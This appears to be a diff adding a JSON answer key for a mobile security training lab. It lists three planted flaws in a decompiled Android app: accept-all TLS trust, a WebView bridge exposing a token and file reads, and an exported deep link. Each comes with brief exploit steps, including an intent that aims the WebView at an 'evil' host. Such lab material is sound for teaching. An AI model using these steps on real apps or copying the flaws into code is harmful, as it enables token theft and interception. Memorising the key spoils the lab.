@@ -1,0 +1,35 @@
+{
+  "lab": "M03-netforge",
+  "platform": "android",
+  "artifact": "labs/mobile/M03-netforge/app  (decompiled apktool tree)",
+  "stack": "Android APK (decompiled) — broken TLS trust + dangerous WebView (rung 3 of the mobile ladder)",
+  "vulns": [
+    {
+      "id": "N1",
+      "class": "improper-tls",
+      "severity": "high",
+      "route": "*",
+      "desc": "InsecureTrust is a custom X509TrustManager whose checkServerTrusted()/checkClientTrusted() bodies are empty (accept ANY certificate), getAcceptedIssuers() returns an empty array, and a HostnameVerifier returns true for every hostname — with no certificate pinning anywhere. The app trusts any TLS cert, so a network attacker MITMs all traffic.",
+      "exploit": "grep -E 'X509TrustManager|checkServerTrusted|HostnameVerifier' smali/ ; proxy with a self-signed CA -> traffic decrypted, no warning.",
+      "points": 1
+    },
+    {
+      "id": "N2",
+      "class": "webview",
+      "severity": "high",
+      "route": "*",
+      "desc": "WebViewActivity enables JavaScript, setAllowFileAccess/setAllowFileAccessFromFileURLs/setAllowUniversalAccessFromFileURLs(true), and adds a native JsBridge as window.android exposing getToken() and readFile(path) to every loaded page — while loading an attacker-controlled URL. Any page can steal the session token and read arbitrary app files (file:// + universal access).",
+      "exploit": "grep -E 'addJavascriptInterface|setAllowUniversalAccessFromFileURLs|JavascriptInterface' smali/ ; load file:///... or a remote page -> window.android.readFile('/data/data/.../shared_prefs/..').",
+      "points": 1
+    },
+    {
+      "id": "N3",
+      "class": "exported-component",
+      "severity": "high",
+      "route": "*",
+      "desc": "WebViewActivity is android:exported=\"true\" with a BROWSABLE deep-link (netforge://open) and loads the URL from the incoming intent's 'url' extra with no validation — so any other app, or any web page, drives the vulnerable WebView with a chosen URL.",
+      "exploit": "am start -a android.intent.action.VIEW -d 'netforge://open' --es url 'https://evil/x' com.netforge.app ; or a web link netforge://open?... .",
+      "points": 1
+    }
+  ]
+}
